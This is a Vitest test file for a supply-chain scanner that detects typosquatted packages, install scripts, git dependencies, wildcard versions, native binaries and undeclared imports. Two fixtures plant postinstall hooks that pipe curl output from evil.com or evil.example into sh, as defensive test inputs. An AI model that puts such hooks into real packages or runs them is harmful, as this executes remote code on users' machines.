import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

const { mockReadFileSafe, mockWalkFiles, mockClearWalkFilesCache } = vi.hoisted(() => ({
  mockReadFileSafe: vi.fn(),
  mockWalkFiles: vi.fn(),
  mockClearWalkFilesCache: vi.fn(),
}));

vi.mock('@aegis-scan/core', () => ({
  commandExists: vi.fn().mockResolvedValue(true),
  exec: vi.fn(),
  readFileSafe: mockReadFileSafe,
  walkFiles: mockWalkFiles,
  clearWalkFilesCache: mockClearWalkFilesCache,
  isTestFile: (filePath) => /\.(test|spec|e2e)\.(ts|tsx|js|jsx|mjs|cjs)$/.test(filePath) || /[\/\\]__tests__[\/\\]/.test(filePath) || /[\/\\]__mocks__[\/\\]/.test(filePath) || /[\/\\](playwright|cypress|e2e)[\/\\]/.test(filePath),
}));

import { supplyChainScanner } from '../../src/dependencies/supply-chain.js';
import type { AegisConfig } from '@aegis-scan/core';

const MOCK_CONFIG = {} as AegisConfig;

describe('supplyChainScanner', () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), 'aegis-supply-chain-'));
    vi.clearAllMocks();
    mockWalkFiles.mockReturnValue([]);
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
  });

  it('is always available (pure file scanner)', async () => {
    expect(await supplyChainScanner.isAvailable('/any/path')).toBe(true);
  });

  // --- Check 1: Typosquatting ---
  describe('typosquatting detection', () => {
    it('detects packages with Levenshtein distance 1 from popular packages', async () => {
      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath.endsWith('package.json') && !filePath.includes('node_modules')) {
          return JSON.stringify({
            dependencies: { 'reac': '^18.0.0' },
          });
        }
        return null;
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const typosquatFindings = result.findings.filter((f) => f.title.includes('typosquatting'));

      expect(typosquatFindings.length).toBeGreaterThan(0);
      expect(typosquatFindings[0].severity).toBe('high');
      expect(typosquatFindings[0].title).toContain('reac');
      expect(typosquatFindings[0].title).toContain('react');
      expect(typosquatFindings[0].cwe).toBe(1357);
    });

    it('does NOT flag the actual popular package itself', async () => {
      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath.endsWith('package.json') && !filePath.includes('node_modules')) {
          return JSON.stringify({
            dependencies: { 'react': '^18.0.0', 'next': '^14.0.0' },
          });
        }
        return null;
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const typosquatFindings = result.findings.filter((f) => f.title.includes('typosquatting'));

      expect(typosquatFindings).toHaveLength(0);
    });
  });

  // --- Check 2: Install Scripts ---
  describe('install scripts detection', () => {
    it('detects packages with postinstall scripts', async () => {
      // Create node_modules with a package that has postinstall
      const nodeModules = join(tempDir, 'node_modules');
      const evilPkg = join(nodeModules, 'evil-pkg');
      mkdirSync(evilPkg, { recursive: true });
      writeFileSync(join(evilPkg, 'package.json'), JSON.stringify({
        name: 'evil-pkg',
        scripts: { postinstall: 'curl http://evil.com | sh' },
      }));

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: { 'evil-pkg': '1.0.0' } });
        }
        // Delegate to real fs for node_modules package.json reads
        try {
          const { readFileSync } = require('node:fs');
          return readFileSync(filePath, 'utf-8');
        } catch {
          return null;
        }
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const installFindings = result.findings.filter((f) => f.title.includes('Install script'));

      expect(installFindings.length).toBeGreaterThan(0);
      expect(installFindings[0].severity).toBe('medium');
      expect(installFindings[0].title).toContain('evil-pkg');
    });
  });

  // --- Check 3: Git/URL Dependencies ---
  describe('git/URL dependency detection', () => {
    it('detects git+ and https://github.com dependencies', async () => {
      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath.endsWith('package.json') && !filePath.includes('node_modules')) {
          return JSON.stringify({
            dependencies: {
              'safe-pkg': '^1.0.0',
              'git-dep': 'git+https://github.com/user/repo.git',
              'url-dep': 'https://github.com/user/repo/tarball/main',
            },
          });
        }
        return null;
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const gitFindings = result.findings.filter((f) => f.title.includes('Git/URL'));

      expect(gitFindings).toHaveLength(2);
      expect(gitFindings[0].severity).toBe('high');
      expect(gitFindings[0].owasp).toBe('A06:2021');
    });
  });

  // --- Check 4: Wildcard Versions ---
  describe('wildcard version detection', () => {
    it('detects *, empty string, and latest versions', async () => {
      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath.endsWith('package.json') && !filePath.includes('node_modules')) {
          return JSON.stringify({
            dependencies: {
              'wild-star': '*',
              'wild-empty': '',
              'wild-latest': 'latest',
              'safe-dep': '^1.0.0',
            },
          });
        }
        return null;
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const wildcardFindings = result.findings.filter((f) => f.title.includes('Wildcard'));

      expect(wildcardFindings).toHaveLength(3);
      expect(wildcardFindings[0].severity).toBe('high');
    });
  });

  // --- Check 5: Binary Detection ---
  describe('binary detection', () => {
    it('detects .node and .so files in node_modules', async () => {
      const nodeModules = join(tempDir, 'node_modules');
      const binPkg = join(nodeModules, 'native-pkg');
      mkdirSync(binPkg, { recursive: true });
      writeFileSync(join(binPkg, 'binding.node'), 'binary content');
      writeFileSync(join(binPkg, 'lib.so'), 'binary content');
      writeFileSync(join(binPkg, 'index.js'), 'module.exports = {}');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: {} });
        }
        return null;
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const binaryFindings = result.findings.filter((f) => f.title.includes('Native binary'));

      expect(binaryFindings).toHaveLength(2);
      expect(binaryFindings[0].severity).toBe('medium');
    });
  });

  // v0.13: Next.js / Rollup / esbuild platform-native packages + postinstall
  // are ecosystem-inherent — emit findings at info severity so they appear
  // in the report (pedagogy) but don't deduct from the score.
  describe('ecosystem-inherent severity downgrade', () => {
    it('emits esbuild postinstall at INFO severity (ecosystem-inherent)', async () => {
      const nodeModules = join(tempDir, 'node_modules');
      const esbuildPkg = join(nodeModules, 'esbuild');
      mkdirSync(esbuildPkg, { recursive: true });
      writeFileSync(join(esbuildPkg, 'package.json'), JSON.stringify({
        name: 'esbuild',
        scripts: { postinstall: 'node install.js' },
      }));

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: { 'esbuild': '^0.25.0' } });
        }
        try {
          const { readFileSync } = require('node:fs');
          return readFileSync(filePath, 'utf-8');
        } catch {
          return null;
        }
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const installFinding = result.findings.find(
        (f) => f.title.includes('Install script') && f.title.includes('esbuild'),
      );
      expect(installFinding).toBeDefined();
      expect(installFinding!.severity).toBe('info');
      expect(installFinding!.description).toContain('Ecosystem-inherent');
    });

    it('emits @next/swc-* native binaries at INFO severity (ecosystem-inherent)', async () => {
      const nodeModules = join(tempDir, 'node_modules');
      const swcPkg = join(nodeModules, '@next', 'swc-darwin-arm64');
      mkdirSync(swcPkg, { recursive: true });
      writeFileSync(join(swcPkg, 'next-swc.darwin-arm64.node'), 'binary content');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: {} });
        }
        return null;
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const swcFinding = result.findings.find(
        (f) => f.title.includes('Native binary') && f.title.includes('@next/swc-darwin-arm64'),
      );
      expect(swcFinding).toBeDefined();
      expect(swcFinding!.severity).toBe('info');
      expect(swcFinding!.description).toContain('Ecosystem-inherent');
    });

    it('emits @rollup/rollup-* native binaries at INFO severity (ecosystem-inherent)', async () => {
      const nodeModules = join(tempDir, 'node_modules');
      const rollupPkg = join(nodeModules, '@rollup', 'rollup-linux-x64-gnu');
      mkdirSync(rollupPkg, { recursive: true });
      writeFileSync(join(rollupPkg, 'rollup.linux-x64-gnu.node'), 'binary content');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: {} });
        }
        return null;
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const rollupFinding = result.findings.find(
        (f) => f.title.includes('Native binary') && f.title.includes('@rollup/rollup-linux-x64-gnu'),
      );
      expect(rollupFinding).toBeDefined();
      expect(rollupFinding!.severity).toBe('info');
    });

    // Threat-model Pass-2: ensure the downgrade is pattern-specific.
    // A random package with a postinstall + .node binary must still
    // emit at MEDIUM — the ecosystem-inherent carve-out is not a
    // blanket allowlist.
    it('still emits MEDIUM for non-ecosystem packages with postinstall or native binaries', async () => {
      const nodeModules = join(tempDir, 'node_modules');
      const sneaky = join(nodeModules, 'totally-not-esbuild');
      mkdirSync(sneaky, { recursive: true });
      writeFileSync(join(sneaky, 'package.json'), JSON.stringify({
        name: 'totally-not-esbuild',
        scripts: { postinstall: 'curl http://evil.example | sh' },
      }));
      writeFileSync(join(sneaky, 'stealth.node'), 'binary content');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: { 'totally-not-esbuild': '1.0.0' } });
        }
        try {
          const { readFileSync } = require('node:fs');
          return readFileSync(filePath, 'utf-8');
        } catch {
          return null;
        }
      });

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const hostileFindings = result.findings.filter(
        (f) => f.title.includes('totally-not-esbuild'),
      );
      expect(hostileFindings.length).toBeGreaterThanOrEqual(2);
      for (const f of hostileFindings) {
        expect(f.severity).toBe('medium');
      }
    });
  });

  // --- Check 6: Phantom Dependencies ---
  describe('phantom dependency detection', () => {
    it('detects imported packages not in package.json', async () => {
      const srcFile = join(tempDir, 'src', 'index.ts');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({
            dependencies: { 'react': '^18.0.0' },
            devDependencies: { 'typescript': '^5.0.0' },
          });
        }
        if (filePath === srcFile) {
          return `import React from 'react';\nimport lodash from 'lodash';\nimport { z } from 'zod';\n`;
        }
        return null;
      });

      mockWalkFiles.mockReturnValue([srcFile]);

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const phantomFindings = result.findings.filter((f) => f.title.includes('Phantom'));

      expect(phantomFindings).toHaveLength(2);
      const phantomNames = phantomFindings.map((f) => f.title);
      expect(phantomNames.some((t) => t.includes('lodash'))).toBe(true);
      expect(phantomNames.some((t) => t.includes('zod'))).toBe(true);
    });

    it('ignores Node.js built-in modules', async () => {
      const srcFile = join(tempDir, 'src', 'util.ts');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: {} });
        }
        if (filePath === srcFile) {
          return `import fs from 'fs';\nimport path from 'path';\nimport { createHash } from 'node:crypto';\n`;
        }
        return null;
      });

      mockWalkFiles.mockReturnValue([srcFile]);

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const phantomFindings = result.findings.filter((f) => f.title.includes('Phantom'));

      expect(phantomFindings).toHaveLength(0);
    });

    it('handles scoped package imports correctly', async () => {
      const srcFile = join(tempDir, 'src', 'app.ts');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({
            dependencies: { '@tanstack/react-query': '^5.0.0' },
          });
        }
        if (filePath === srcFile) {
          return `import { useQuery } from '@tanstack/react-query';\nimport { auth } from '@clerk/nextjs';\n`;
        }
        return null;
      });

      mockWalkFiles.mockReturnValue([srcFile]);

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const phantomFindings = result.findings.filter((f) => f.title.includes('Phantom'));

      // @tanstack/react-query is declared, @clerk/nextjs is not
      expect(phantomFindings).toHaveLength(1);
      expect(phantomFindings[0].title).toContain('@clerk/nextjs');
    });

    it('ignores relative imports', async () => {
      const srcFile = join(tempDir, 'src', 'app.ts');

      mockReadFileSafe.mockImplementation((filePath: string) => {
        if (filePath === join(tempDir, 'package.json')) {
          return JSON.stringify({ dependencies: {} });
        }
        if (filePath === srcFile) {
          return `import { helper } from './utils';\nimport config from '../config';\n`;
        }
        return null;
      });

      mockWalkFiles.mockReturnValue([srcFile]);

      const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);
      const phantomFindings = result.findings.filter((f) => f.title.includes('Phantom'));

      expect(phantomFindings).toHaveLength(0);
    });
  });

  // --- ID prefix ---
  it('uses SUPPLY- prefix for finding IDs', async () => {
    mockReadFileSafe.mockImplementation((filePath: string) => {
      if (filePath.endsWith('package.json') && !filePath.includes('node_modules')) {
        return JSON.stringify({
          dependencies: { 'wild': '*' },
        });
      }
      return null;
    });

    const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);

    expect(result.findings.length).toBeGreaterThan(0);
    expect(result.findings[0].id).toMatch(/^SUPPLY-\d{3}$/);
  });

  it('handles missing package.json gracefully', async () => {
    mockReadFileSafe.mockReturnValue(null);

    const result = await supplyChainScanner.scan(tempDir, MOCK_CONFIG);

    expect(result.findings).toHaveLength(0);
    expect(result.scanner).toBe('supply-chain');
    expect(result.category).toBe('dependencies');
  });
});
